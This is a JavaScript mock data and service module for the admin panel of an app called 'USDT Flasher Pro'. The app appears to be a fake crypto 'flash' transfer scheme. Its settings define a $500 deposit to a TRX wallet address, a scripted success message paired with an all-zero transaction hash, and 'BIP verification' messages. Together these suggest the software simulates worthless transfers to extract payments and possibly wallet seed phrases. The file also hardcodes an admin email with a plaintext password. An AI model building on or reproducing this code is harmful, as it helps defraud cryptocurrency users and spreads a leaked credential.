// This is a mock implementation of the SQLite service for the browser environment
// In a real application, you would use a backend server to handle SQLite operations

// Mock data for license keys
const mockLicenseKeys = [
  {
    id: 1,
    key: 'USDT-ABCD-1234-EFGH-5678',
    status: 'active',
    created_at: '2025-01-15T10:30:00.000Z',
    expires_at: '2026-01-15T10:30:00.000Z',
    user: 'user1@example.com'
  },
  {
    id: 2,
    key: 'USDT-IJKL-9012-MNOP-3456',
    status: 'active',
    created_at: '2025-02-20T14:45:00.000Z',
    expires_at: '2026-02-20T14:45:00.000Z',
    user: 'user2@example.com'
  },
  {
    id: 3,
    key: 'USDT-QRST-7890-UVWX-1234',
    status: 'expired',
    created_at: '2024-03-10T09:15:00.000Z',
    expires_at: '2025-03-10T09:15:00.000Z',
    user: 'user3@example.com'
  }
];

// Mock data for contact info
const mockContactInfo = {
  primaryPhone: '+447013216​28',
  secondaryPhone: '+14693510740',
  tertiaryPhone: '+91 7823232332',
  email: 'support@usdtflasherpro.com',
  website: 'https://usdtflasherpro.com',
  telegramUsername: '@usdtflasherpro',
  discordServer: 'discord.gg/usdtflasherpro'
};

// Mock data for contact info history
const mockContactInfoHistory = [
  {
    id: 1,
    field: 'primaryPhone',
    oldValue: '+447013216​27',
    newValue: '+447013216​28',
    timestamp: '2025-02-15T10:30:00.000Z',
    user: 'admin'
  },
  {
    id: 2,
    field: 'email',
    oldValue: 'info@usdtflasherpro.com',
    newValue: 'support@usdtflasherpro.com',
    timestamp: '2025-02-10T14:45:00.000Z',
    user: 'admin'
  }
];

// Mock data for app settings
const mockAppSettings = {
  // Application Settings
  appVersion: '4.8',
  updateChannel: 'stable',
  autoUpdate: true,
  
  // UI Settings
  theme: 'dark',
  accentColor: '#00e6b8',
  animationsEnabled: true,
  
  // Security Settings
  sessionTimeout: 30,
  requirePasswordOnStartup: true,
  twoFactorAuth: false,
  
  // Flash Settings
  defaultNetwork: 'trc20',
  maxFlashAmount: 100000,
  demoMaxFlashAmount: 30,
  liveMaxFlashAmount: 10000000,
  defaultDelayDays: 0,
  defaultDelayMinutes: 0,
  
  // Advanced Settings
  debugMode: false,
  logLevel: 'info',
  apiEndpoint: 'https://api.usdtflasherpro.com/v1',
  
  // Payment Settings
  depositAmount: 500,
  transactionFee: 'Transaction Fee',
  walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
  
  // Success Modal Settings
  successTitle: 'Success',
  successMessage: 'The flash has been sent successfully',
  transactionHash: '0000000000000000000000000000000000000000000000000000000000000000',
  
  // Message Templates
  initialLoadingMessages: JSON.stringify(require('../constants').initialLoadingMessages),
  licenseVerificationMessages: JSON.stringify(require('../constants').licenseVerificationMessages),
  bipVerificationMessages: JSON.stringify(require('../constants').bipVerificationMessages),
  
  // Dropdown Options
  walletOptions: JSON.stringify(require('../constants').walletOptions),
  currencyOptions: JSON.stringify(require('../constants').currencyOptions),
  networkOptions: JSON.stringify(require('../constants').networkOptions),
  dayOptions: JSON.stringify(require('../constants').dayOptions),
  minuteOptions: JSON.stringify(require('../constants').minuteOptions)
};

// Mock data for settings history
const mockSettingsHistory = [
  {
    id: 1,
    field: 'theme',
    oldValue: 'light',
    newValue: 'dark',
    timestamp: '2025-02-15T10:30:00.000Z',
    user: 'admin'
  },
  {
    id: 2,
    field: 'maxFlashAmount',
    oldValue: '50000',
    newValue: '100000',
    timestamp: '2025-02-10T14:45:00.000Z',
    user: 'admin'
  }
];

// Mock data for flash transactions
const mockFlashTransactions = [
  {
    id: 1,
    transaction_id: 'TX123456789',
    license_key_id: 1,
    receiver_address: '0x1234567890abcdef1234567890abcdef12345678',
    amount: 1000,
    wallet_type: 'MetaMask',
    currency: 'USDT',
    network: 'trc20',
    delay_days: 0,
    delay_minutes: 30,
    use_proxy: 1,
    transferable: 1,
    swappable: 1,
    p2p_tradable: 0,
    splittable: 0,
    timestamp: '2025-03-01T10:30:00.000Z'
  },
  {
    id: 2,
    transaction_id: 'TX987654321',
    license_key_id: 2,
    receiver_address: '0xabcdef1234567890abcdef1234567890abcdef12',
    amount: 5000,
    wallet_type: 'Trust Wallet',
    currency: 'USDT',
    network: 'erc20',
    delay_days: 1,
    delay_minutes: 0,
    use_proxy: 0,
    transferable: 0,
    swappable: 1,
    p2p_tradable: 1,
    splittable: 1,
    timestamp: '2025-03-02T14:45:00.000Z'
  }
];

// Mock data for users
const mockUsers = [
  {
    id: 1,
    email: 'mikebtcretriever@gmail.com',
    password: 'Gateway@523',
    display_name: 'Admin User',
    role: 'admin',
    created_at: '2025-01-01T00:00:00.000Z',
    last_login: '2025-03-04T10:30:00.000Z'
  }
];

// License Key functions
function getLicenseKeys() {
  return Promise.resolve([...mockLicenseKeys]);
}

function getLicenseKey(id) {
  const licenseKey = mockLicenseKeys.find(key => key.id === id);
  
  if (!licenseKey) {
    return Promise.reject(new Error('License key not found'));
  }
  
  return Promise.resolve({...licenseKey});
}

function createLicenseKey(licenseData) {
  const newId = mockLicenseKeys.length > 0 ? Math.max(...mockLicenseKeys.map(key => key.id)) + 1 : 1;
  
  const newLicenseKey = {
    id: newId,
    ...licenseData
  };
  
  mockLicenseKeys.push(newLicenseKey);
  
  return Promise.resolve({...newLicenseKey});
}

function updateLicenseKey(id, licenseData) {
  const index = mockLicenseKeys.findIndex(key => key.id === id);
  
  if (index === -1) {
    return Promise.reject(new Error('License key not found'));
  }
  
  mockLicenseKeys[index] = {
    ...mockLicenseKeys[index],
    ...licenseData
  };
  
  return Promise.resolve({...mockLicenseKeys[index]});
}

function deleteLicenseKey(id) {
  const index = mockLicenseKeys.findIndex(key => key.id === id);
  
  if (index === -1) {
    return Promise.reject(new Error('License key not found'));
  }
  
  mockLicenseKeys.splice(index, 1);
  
  return Promise.resolve(id);
}

// Contact Information functions
function getContactInfo() {
  return Promise.resolve({...mockContactInfo});
}

function updateContactInfo(contactData) {
  // In a real app, we would update the database
  // For now, just update the mock data
  Object.assign(mockContactInfo, contactData);
  
  // Add to history
  const newHistoryId = mockContactInfoHistory.length > 0 ? Math.max(...mockContactInfoHistory.map(h => h.id)) + 1 : 1;
  
  // For simplicity, we're just adding one history entry for the primary phone
  mockContactInfoHistory.push({
    id: newHistoryId,
    field: 'primaryPhone',
    oldValue: mockContactInfo.primaryPhone,
    newValue: contactData.primaryPhone,
    timestamp: new Date().toISOString(),
    user: 'admin'
  });
  
  return Promise.resolve({...mockContactInfo});
}

function getContactInfoHistory(limit = 10) {
  return Promise.resolve([...mockContactInfoHistory].slice(0, limit));
}

// App Settings functions
function getAppSettings() {
  return Promise.resolve({...mockAppSettings});
}

function updateAppSettings(settingsData) {
  // In a real app, we would update the database
  // For now, just update the mock data
  Object.assign(mockAppSettings, settingsData);
  
  // Add to history
  const newHistoryId = mockSettingsHistory.length > 0 ? Math.max(...mockSettingsHistory.map(h => h.id)) + 1 : 1;
  
  // For simplicity, we're just adding one history entry for the theme
  mockSettingsHistory.push({
    id: newHistoryId,
    field: 'theme',
    oldValue: mockAppSettings.theme,
    newValue: settingsData.theme,
    timestamp: new Date().toISOString(),
    user: 'admin'
  });
  
  return Promise.resolve({...mockAppSettings});
}

// Flash Transaction functions
function getFlashHistory(licenseKeyId) {
  return Promise.resolve(
    mockFlashTransactions.filter(tx => tx.license_key_id === licenseKeyId)
  );
}

// User Authentication functions
function authenticateUser(email, password) {
  const user = mockUsers.find(u => u.email === email && u.password === password);
  
  if (!user) {
    return Promise.resolve({ success: false, message: 'Invalid email or password' });
  }
  
  return Promise.resolve({
    success: true,
    user: {
      id: user.id,
      email: user.email,
      displayName: user.display_name,
      role: user.role
    }
  });
}

// Export functions
export {
  getLicenseKeys,
  getLicenseKey,
  createLicenseKey,
  updateLicenseKey,
  deleteLicenseKey,
  getContactInfo,
  updateContactInfo,
  getContactInfoHistory,
  getAppSettings,
  updateAppSettings,
  getFlashHistory,
  authenticateUser
};
